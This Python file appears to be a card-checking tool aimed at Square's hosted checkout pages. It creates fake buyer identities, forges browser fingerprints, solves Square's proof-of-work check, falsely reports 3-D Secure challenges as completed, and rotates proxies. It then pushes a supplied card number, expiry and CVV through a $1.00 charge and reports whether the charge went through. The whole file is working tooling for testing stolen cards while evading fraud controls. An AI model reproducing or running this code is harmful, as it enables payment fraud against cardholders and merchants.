import hashlib
import os
import time
import uuid
import json
import random
import string
import asyncio
import re
from typing import Optional, Dict, Any
import httpx

_FIRST = ["james","john","robert","michael","william","david","richard","joseph",
          "thomas","charles","emma","olivia","ava","isabella","sophia","mia",
          "charlotte","amelia","harper","evelyn"]
_LAST  = ["smith","johnson","williams","brown","jones","garcia","miller","davis",
          "wilson","taylor","anderson","thomas","jackson","white","harris","martin"]
_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"]

CLIENT_ID    = "sq0idp-w46nJ_NCNDMSOywaCY0mwA"
SDK_VERSION  = "1.83.14"

def _rand_ua() -> tuple[str, str]:
    major = random.randint(120, 131)
    build = random.randint(6000, 6999)
    patch = random.randint(0, 150)
    ua = (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{major}.0.{build}.{patch} Safari/537.36"
    )
    ch = f'"Not;A=Brand";v="8", "Chromium";v="{major}", "Google Chrome";v="{major}"'
    return ua, ch

def _rand_identity() -> tuple[str, str, str, str]:
    first = random.choice(_FIRST).capitalize()
    last  = random.choice(_LAST).capitalize()
    tag   = "".join(random.choices(string.digits, k=random.randint(2, 5)))
    email = f"{first.lower()}{last.lower()}{tag}@{random.choice(_DOMAINS)}"
    area  = random.randint(200, 999)
    exch  = random.randint(200, 999)
    num   = random.randint(1000, 9999)
    phone = f"{area}{exch}{num}"
    return first, last, email, phone

def _parse_square_url(url: str):
    m = re.search(r"merchant/([A-Z0-9]+)/checkout/([A-Z0-9]+)", url, re.IGNORECASE)
    if not m:
        raise ValueError("Invalid Square URL. Expected: https://checkout.square.site/merchant/XXXXX/checkout/YYYYY")
    return m.group(1).upper(), m.group(2).upper()

_US_TZ = [
    ("America/New_York",    -300, "en-US,en;q=0.9"),
    ("America/Chicago",     -360, "en-US,en;q=0.9,es;q=0.8"),
    ("America/Denver",      -420, "en-US,en;q=0.9"),
    ("America/Los_Angeles", -480, "en-US,en;q=0.9,es;q=0.8"),
]
_SCREEN = [(1920, 1080, 1920, 1040), (1366, 768, 1366, 728), (1536, 864, 1536, 824)]
_HW_CONC = [4, 6, 8, 12]
_DEV_MEM = [4, 8, 16]
_US_ZIPS = ["10001", "90024", "60601", "77002", "85004", "30305", "98103", "02108"]

def _rand_zip() -> str:
    return random.choice(_US_ZIPS)

_FP_V1_HASH_TMPL  = "4b536f5cb86ab2daf3d04a272d8b3817"
_FP_V1S_HASH_TMPL = "eae1bbcaefa5a83e881161b62f1253c1"
_FP_V2_HASH_TMPL  = "6c18ba582e42e6239a56394f6b87b715"

FP_V1_STR  = '{"user_agent":"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36","language":"en-GB","resolution":[1536,864],"available_resolution":[1536,816],"timezone_offset":-330,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Georgia","Helvetica","Segoe UI","Times New Roman","Verdana"]}'
FP_V1S_STR = '{"language":"en-GB","resolution":[1536,864],"available_resolution":[1536,816],"timezone_offset":-330,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Georgia","Helvetica","Segoe UI","Times New Roman","Verdana"]}'
FP_V2_STR  = '{"fonts":["Calibri","Georgia","Segoe UI"],"font_preferences":{"default":119.45,"apple":119.45,"serif":119.45,"sans":115.21,"mono":97.21,"min":7.47,"system":118.28},"audio":124.04,"screen_frame":[0,0,50,0],"languages":[["en-GB"]],"device_memory":16,"screen_resolution":[864,1536],"hardware_concurrency":12,"timezone":"Asia/Calcutta","indexed_db":true,"open_database":false,"platform":"Win32","plugins":[],"canvas":{"winding":true},"touch_support":{"maxTouchPoints":1,"touchEvent":true,"touchStart":true},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false}'

_VERF_V1_PJ_TMPL  = '{"components":{"user_agent":"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36","language":"en-GB","resolution":[1536,864],"available_resolution":[1536,816],"timezone_offset":-330,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Georgia"]},"fingerprint":"4b536f5cb86ab2daf3d04a272d8b3817"}'
_VERF_V1S_PJ_TMPL = '{"components":{"language":"en-GB","resolution":[1536,864],"available_resolution":[1536,816],"timezone_offset":-330,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Georgia"]},"fingerprint":"eae1bbcaefa5a83e881161b62f1253c1"}'
_VERF_V2_PJ_TMPL  = '{"components":{"fonts":["Calibri","Georgia"],"font_preferences":{"default":119.45,"apple":119.45,"serif":119.45,"sans":115.21,"mono":97.21,"min":7.47,"system":118.28},"audio":124.04,"screen_frame":[0,0,50,0],"languages":[["en-GB"]],"device_memory":16,"screen_resolution":[864,1536],"hardware_concurrency":12,"timezone":"Asia/Calcutta","indexed_db":true,"open_database":false,"platform":"Win32","plugins":[],"canvas":{"winding":true},"touch_support":{"maxTouchPoints":1,"touchEvent":true,"touchStart":true},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false},"fingerprint":"6c18ba582e42e6239a56394f6b87b715"}'

def _rand_fp(ua: str):
    tz_name, tz_off, lang = random.choice(_US_TZ)
    sw, sh, aw, ah        = random.choice(_SCREEN)
    hw  = random.choice(_HW_CONC)
    mem = random.choice(_DEV_MEM)
    lt  = lang.split(",")[0]

    def rh() -> str:
        return "".join(random.choices("0123456789abcdef", k=32))

    h1, h1s, h2 = rh(), rh(), rh()

    v1 = (FP_V1_STR.replace('"user_agent":"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"', f'"user_agent":{json.dumps(ua)}')
          .replace('"language":"en-GB"', f'"language":"{lt}"')
          .replace('"timezone_offset":-330', f'"timezone_offset":{tz_off}')
          .replace('"resolution":[1536,864]', f'"resolution":[{sw},{sh}]')
          .replace('"available_resolution":[1536,816]', f'"available_resolution":[{aw},{ah}]'))
    v1s = (FP_V1S_STR.replace('"language":"en-GB"', f'"language":"{lt}"')
           .replace('"timezone_offset":-330', f'"timezone_offset":{tz_off}')
           .replace('"resolution":[1536,864]', f'"resolution":[{sw},{sh}]')
           .replace('"available_resolution":[1536,816]', f'"available_resolution":[{aw},{ah}]'))
    v2 = (FP_V2_STR.replace('"languages":[["en-GB"]]', f'"languages":[["{lt}"]]')
          .replace('"device_memory":16', f'"device_memory":{mem}')
          .replace('"screen_resolution":[864,1536]', f'"screen_resolution":[{sh},{sw}]')
          .replace('"hardware_concurrency":12', f'"hardware_concurrency":{hw}')
          .replace('"timezone":"Asia/Calcutta"', f'"timezone":"{tz_name}"'))

    vf1 = (_VERF_V1_PJ_TMPL.replace('"user_agent":"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"', f'"user_agent":{json.dumps(ua)}')
           .replace('"language":"en-GB"', f'"language":"{lt}"')
           .replace('"timezone_offset":-330', f'"timezone_offset":{tz_off}')
           .replace('"resolution":[1536,864]', f'"resolution":[{sw},{sh}]')
           .replace('"available_resolution":[1536,816]', f'"available_resolution":[{aw},{ah}]')
           .replace(f'"{_FP_V1_HASH_TMPL}"', f'"{h1}"'))
    vf1s = (_VERF_V1S_PJ_TMPL.replace('"language":"en-GB"', f'"language":"{lt}"')
            .replace('"timezone_offset":-330', f'"timezone_offset":{tz_off}')
            .replace('"resolution":[1536,864]', f'"resolution":[{sw},{sh}]')
            .replace('"available_resolution":[1536,816]', f'"available_resolution":[{aw},{ah}]')
            .replace(f'"{_FP_V1S_HASH_TMPL}"', f'"{h1s}"'))
    vf2 = (_VERF_V2_PJ_TMPL.replace('"languages":[["en-GB"]]', f'"languages":[["{lt}"]]')
           .replace('"device_memory":16', f'"device_memory":{mem}')
           .replace('"screen_resolution":[864,1536]', f'"screen_resolution":[{sh},{sw}]')
           .replace('"hardware_concurrency":12', f'"hardware_concurrency":{hw}')
           .replace('"timezone":"Asia/Calcutta"', f'"timezone":"{tz_name}"')
           .replace(f'"{_FP_V2_HASH_TMPL}"', f'"{h2}"'))

    return v1, v1s, v2, h1, h1s, h2, vf1, vf1s, vf2, tz_name, tz_off, lang, sw, sh

def _h_checkout_api(ua: str, ch: str, merchant_id: str = "", checkout_id: str = "", lang: str = "en-US,en;q=0.9") -> dict:
    referer = f"https://checkout.square.site/merchant/{merchant_id}/checkout/{checkout_id}" if merchant_id and checkout_id else "https://checkout.square.site/"
    return {
        "accept-language":    lang,
        "cache-control":      "no-cache",
        "pragma":             "no-cache",
        "priority":           "u=1, i",
        "sec-ch-ua":          ch,
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "user-agent":         ua,
        "accept":             "application/json, text/plain, */*",
        "content-type":       "application/json",
        "origin":             "https://checkout.square.site",
        "referer":            referer,
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-origin",
    }

def _h_pci(ua: str, ch: str, storage_access: str = "none", lang: str = "en-US,en;q=0.9") -> dict:
    return {
        "accept-language":           lang,
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "priority":                  "u=1, i",
        "sec-ch-ua":                 ch,
        "sec-ch-ua-mobile":          "?0",
        "sec-ch-ua-platform":        '"Windows"',
        "user-agent":                ua,
        "accept":                    "application/json",
        "content-type":              "application/json; charset=utf-8",
        "origin":                    "https://web.squarecdn.com",
        "referer":                   "https://web.squarecdn.com/",
        "sec-fetch-dest":            "empty",
        "sec-fetch-mode":            "cors",
        "sec-fetch-site":            "cross-site",
        "sec-fetch-storage-access":  storage_access,
    }

async def _run_with_client(
    client, merchant_id: str, checkout_id: str,
    ua: str, ch: str, first_name: str, last_name: str, email: str, phone: str,
    cc: str, mes: str, ano: str, cvv: str, zip_code: str,
) -> Optional[Dict[str, Any]]:
    v1_str, v1s_str, v2_str, h1, h1s, h2, vf1, vf1s, vf2, \
        tz_name, tz_off, lang, sw, sh = _rand_fp(ua)

    H    = lambda: _h_checkout_api(ua, ch, merchant_id, checkout_id, lang=lang)
    Hpci = lambda sa="none": _h_pci(ua, ch, storage_access=sa, lang=lang)

    s1_url  = f"https://checkout.square.site/api/merchant/{merchant_id}/checkout/{checkout_id}"
    s1_body = {
        "buyerControlledPrice": {"amount": 100, "currency": "USD", "precision": 2},
        "subscriptionPlanId":   None,
        "oneTimePayment":       True,
        "itemCustomizations":   [],
    }
    try:
        r1 = await client.post(s1_url, headers=H(), json=s1_body)
        r1.raise_for_status()
        order_data = r1.json()
    except Exception:
        return None

    order_id    = (order_data.get("order") or {}).get("id")
    location_id = (order_data.get("order") or {}).get("location_id", "")
    if not order_id:
        return None

    BASE = f"https://checkout.square.site/api/merchant/{merchant_id}"
    try:
        await client.patch(f"{BASE}/location/{location_id}/order/{order_id}", headers=H(), json=s1_body)
    except Exception:
        pass

    try:
        await client.patch(f"{BASE}/location/{location_id}/order/{order_id}/visited", headers=H())
    except Exception:
        pass

    cust_body = {
        "given_name": first_name, "family_name": last_name, "email_address": email,
        "phone_number": {"national_number": phone, "region_code": "US", "country_code": "1", "formatted": ""},
        "shipping_address": {
            "first_name": first_name, "last_name": last_name, "full_name": f"{first_name} {last_name}",
            "phone": {"national_number": phone, "region_code": "US", "country_code": "1", "formatted": ""},
            "address_line_1": None, "address_line_2": None, "locality": None,
            "administrative_district_level_1": None, "postal_code": None, "country": None, "label": "Shipping",
        },
    }
    try:
        await client.patch(f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}/customer", headers=H(), json=cust_body)
    except Exception:
        pass

    await asyncio.sleep(random.uniform(0.2, 0.6))

    try:
        r_hyd = await client.get(
            "https://pci-connect.squareup.com/payments/hydrate",
            headers={**Hpci(sa="active"), "accept": "*/*"},
            params={"applicationId": CLIENT_ID, "hostname": "checkout.square.site", "locationId": location_id, "version": SDK_VERSION},
        )
        r_hyd.raise_for_status()
        hyd_data = r_hyd.json()
    except Exception:
        return None

    session_id  = hyd_data.get("sessionId", "")
    instance_id = hyd_data.get("instanceId", str(uuid.uuid4()))
    pow_prefix  = hyd_data.get("powPrefix", "000")
    if not session_id:
        return None

    avt_val  = hyd_data.get("avt", "")
    cfbm_val = ""
    raw_sc   = r_hyd.headers.get("set-cookie", "")
    if "__cf_bm=" in raw_sc:
        cfbm_val = raw_sc.split("__cf_bm=", 1)[1].split(";")[0].strip()
    pci_ck: dict = {}
    if avt_val or cfbm_val:
        cookie_parts = []
        if avt_val:  cookie_parts.append(f"_savt={avt_val}")
        if cfbm_val: cookie_parts.append(f"__cf_bm={cfbm_val}")
        pci_ck = {"cookie": "; ".join(cookie_parts)}
        if avt_val:
            pci_ck["x-allow-cookies"] = f"_savt={avt_val}"

    await asyncio.sleep(random.uniform(0.2, 0.6))

    try:
        await client.post("https://pci-connect.squareup.com/v2/tokenization/product-information", headers={**Hpci(), **pci_ck}, json={"bin": cc[:11], "client_id": CLIENT_ID, "session_id": session_id})
    except Exception:
        pass

    await asyncio.sleep(random.uniform(0.2, 0.6))

    pre_three_ds_txn_id: Optional[str] = None
    try:
        r17 = await client.post("https://pci-connect.squareup.com/v2/analytics/three-ds-method", headers={**Hpci(), **pci_ck}, json={"bin": cc[:6], "client_id": CLIENT_ID, "universal_token": {"token": location_id, "type": "UNIT"}})
        if r17.status_code == 200:
            pre_three_ds_txn_id = r17.json().get("three_ds_server_transaction_id")
    except Exception:
        pass

    pow_counter: Optional[int] = None
    if pow_prefix:
        suffix = f"{CLIENT_ID},{location_id},{instance_id}"
        for i in range(1, 500_000):
            if hashlib.sha256(f"{session_id}:{i}:{suffix}".encode()).hexdigest().startswith(pow_prefix):
                pow_counter = i
                break

    await asyncio.sleep(random.uniform(0.2, 0.6))

    nonce_url     = "https://pci-connect.squareup.com/v2/card-nonce"
    nonce_hdrs    = {**Hpci(), **pci_ck}
    nonce_payload = {
        "analytics": {
            "fingerprints": [
                {"components": v1_str,  "fingerprint": h1,  "version": "fingerprint-v1"},
                {"components": v1s_str, "fingerprint": h1s, "version": "fingerprint-v1-sans-ua"},
                {"components": v2_str,  "fingerprint": h2,  "version": "fingerprint-v2"},
            ],
            "timezone": str(tz_off), "website_url": "https://checkout.square.site/",
        },
        "client_id": CLIENT_ID, "instance_id": instance_id, "location_id": location_id,
        "payment_method_tracking_id": str(uuid.uuid4()), "session_id": session_id, "squarejs_version": SDK_VERSION,
        "card_data": {"billing_postal_code": zip_code, "cvv": cvv, "exp_month": int(mes), "exp_year": int(ano), "number": cc},
        **({"pow_counter": pow_counter} if pow_counter is not None else {}),
    }

    card_nonce: Optional[str] = None
    for _iter in range(20):
        ts_ms        = int(time.time() * 1000)
        nonce_params = {"_": f"{ts_ms}.{random.randint(1000,9999)}", "version": SDK_VERSION}
        try:
            r2 = await client.post(nonce_url, headers=nonce_hdrs, params=nonce_params, json=nonce_payload)
        except Exception:
            return None
        if r2.status_code != 200:
            return None
        nd = r2.json()
        if "pow_prefix" in nd:
            srv_base, srv_prefix = nd["pow_base"], nd["pow_prefix"]
            suffix = f"{CLIENT_ID},{location_id},{instance_id}"
            for i in range(1, 500_000):
                if hashlib.sha256(f"{srv_base}:{i}:{suffix}".encode()).hexdigest().startswith(srv_prefix):
                    nonce_payload["session_id"]  = srv_base
                    nonce_payload["pow_counter"] = i
                    break
            else:
                return None
            continue
        if "card_nonce" in nd:
            card_nonce = nd["card_nonce"]
            break
        return None

    if not card_nonce:
        return None

    await asyncio.sleep(random.uniform(0.2, 0.6))

    three_ds_txn_id = pre_three_ds_txn_id or str(uuid.uuid4())
    verf_payload = {
        "browser_fingerprint_by_version": [
            {"payload_json": vf1,  "payload_type": "fingerprint-v1"},
            {"payload_json": vf1s, "payload_type": "fingerprint-v1-sans-ua"},
            {"payload_json": vf2,  "payload_type": "fingerprint-v2"},
        ],
        "browser_profile": {"components": v1_str, "fingerprint": h1, "timezone": str(tz_off), "user_agent": ua, "version": SDK_VERSION, "website_url": "https://checkout.square.site/"},
        "client_id": CLIENT_ID, "payment_source": card_nonce, "universal_token": {"token": location_id, "type": "UNIT"},
        "verification_details": {"billing_contact": {"country": "US", "email": email, "phone": phone, "postal_code": zip_code}, "intent": "CHARGE", "total": {"amount": 100, "currency": "USD"}},
        "three_ds_server_transaction_id": three_ds_txn_id,
    }
    buyer_verification_token: Optional[str] = None
    r3a = None
    try:
        r3a = await client.post("https://pci-connect.squareup.com/v2/analytics/verifications", headers={**Hpci(), **pci_ck}, json=verf_payload)
    except Exception:
        pass

    if r3a is not None and r3a.status_code == 200:
        verf3a     = r3a.json()
        verf_token = verf3a.get("token", "")
        challenges = verf3a.get("challenges", [])
        if not challenges:
            buyer_verification_token = verf_token
        else:
            try:
                await client.put(f"https://pci-connect.squareup.com/v2/analytics/verifications/{verf_token}/three-ds-authentication", headers={**Hpci(), **pci_ck}, json={"browser_info": {"color_depth": 24, "java_enabled": False, "screen_height": sh, "screen_width": sw}, "client_id": CLIENT_ID, "token": verf_token})
            except Exception:
                pass
            challenge_updates = []
            for ch_item in challenges:
                if ch_item.get("type") == "SQUARE_THREEDS":
                    sq3ds = ch_item.get("square_three_ds_verification", {})
                    challenge_updates.append({"square_threeds_verification": {"directory_server_id": sq3ds.get("directory_server_id", "A000000004"), "message_version": sq3ds.get("message_version", "2.2.0"), "status": "COMPLETED", "three_ds_server_transaction_id": sq3ds.get("three_ds_server_transaction_id", three_ds_txn_id)}, "type": "SQUARE_THREEDS"})
            try:
                r3c = await client.put(f"https://pci-connect.squareup.com/v2/analytics/verifications/{verf_token}", headers={**Hpci(), **pci_ck}, json={"challenge_updates": challenge_updates, "client_id": CLIENT_ID})
                buyer_verification_token = (r3c.json().get("token") if r3c.status_code == 200 else None) or verf_token
            except Exception:
                buyer_verification_token = verf_token

    await asyncio.sleep(random.uniform(0.2, 0.6))

    s4_body: Dict[str, Any] = {"nonce": card_nonce, "buyer_postal_code": zip_code, "create_stored_payment_method": False, "country": "US"}
    if buyer_verification_token:
        s4_body["buyer_verification_token"] = buyer_verification_token
    try:
        r4 = await client.post(f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}/checkout", headers=H(), json=s4_body)
    except Exception:
        return None
    try:
        pay_data = r4.json()
    except Exception:
        pay_data = {"raw": r4.text}
    return {"status_code": r4.status_code, "data": pay_data}

async def process_square(merchant_id: str, checkout_id: str, cc: str, mes: str, ano: str, cvv: str, zip_code: Optional[str] = None, proxy: Optional[str] = None) -> Optional[Dict[str, Any]]:
    zip_code = zip_code or _rand_zip()
    ua, ch = _rand_ua()
    first_name, last_name, email, phone = _rand_identity()

    def _format_proxy(p):
        if not p: return None
        ps = str(p).strip()
        if ps.startswith(("http://", "https://", "socks5://", "socks4://")): return ps
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
        return f"http://{ps}"

    formatted_proxy = _format_proxy(proxy)
    proxies_to_try = [formatted_proxy, None] if formatted_proxy else [None]

    for px in proxies_to_try:
        kw: Dict[str, Any] = {"timeout": 30}
        if px:
            kw["proxy"] = px
        try:
            async with httpx.AsyncClient(**kw) as client:
                result = await _run_with_client(client, merchant_id, checkout_id, ua, ch, first_name, last_name, email, phone, cc, mes, ano, cvv, zip_code)
            return result
        except Exception:
            if px is None:
                return None
            continue
    return None

def _extract_square_result(result) -> tuple[bool, str]:
    if result is None:
        return False, "ERROR"
    sc   = result.get("status_code")
    data = result.get("data", {})
    if sc == 200 and data.get("payment", {}).get("id"):
        pid = data.get("payment", {}).get("id", "")
        return True, f"CHARGED $1.00 (ID: {pid})"
    errors = data.get("errors") or []
    code   = errors[0].get("code") if errors else None
    if not code:
        code = (data.get("payment") or {}).get("card_details", {}).get("errors", [{}])[0].get("code")
    detail = errors[0].get("detail") if errors else ""
    msg = f"{code}: {detail}" if code and detail else (code or "DECLINED")
    return False, msg
